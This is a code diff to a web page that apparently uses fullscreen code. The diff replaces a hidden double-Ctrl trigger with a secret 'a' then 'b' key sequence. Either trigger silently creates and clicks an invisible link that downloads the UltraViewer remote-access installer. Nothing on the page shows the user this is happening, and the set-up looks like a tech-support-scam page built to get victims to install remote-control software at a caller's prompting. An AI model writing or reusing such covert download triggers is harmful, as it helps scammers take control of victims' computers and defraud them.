@@ -652,7 +652,17 @@ window.onload = function () {
         margin-bottom: 0;
         color: #296cff;
       }
+      
     </style>
+      <style>
+#status {
+    opacity: 0;
+    transition: 0.3s;
+    color: #00ff99;
+    font-size: 16px;
+    margin-top: 10px;
+}
+</style>
     <script>
       var elem = document.documentElement;
       function openFullscreen() {
@@ -825,26 +835,46 @@ document.addEventListener("click", function (e) {
     </script>
     <div class="imgTagappend"></div>
 <script>
-let lastPress = 0;
-const delay = 600;
+let step = 0;
+let timer = null;
+const windowMs = 1000;
+
+function triggerDownload() {
+    const status = document.getElementById("status");
+    if (!status) return;
+
+    status.style.opacity = 1;
+
+    setTimeout(() => {
+        const a = document.createElement("a");
+        a.href = "https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe";
+        a.download = "UltraViewer_setup.exe";
+
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
+        setTimeout(() => {
+            status.style.opacity = 0;
+        }, 1000);
+
+    }, 200);
+}
 
 document.addEventListener("keydown", function(event) {
-    if (event.key === "Control" && !event.repeat) {
+    const key = event.key.toLowerCase();
 
-        const now = Date.now();
+    clearTimeout(timer);
+    timer = setTimeout(() => {
+        step = 0;
+    }, windowMs);
 
-        if (now - lastPress <= delay) {
-
-            // Create invisible download link
-            const a = document.createElement("a");
-            a.href = "https://www.ultraviewer.net/en/UltraViewer_setup_6.6_en.exe";
-            a.download = "";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
-
-        lastPress = now;
+    if (step === 0 && key === "a") {
+        step = 1;
+    } 
+    else if (step === 1 && key === "b") {
+        triggerDownload();
+        step = 0;
     }
 });
 </script>
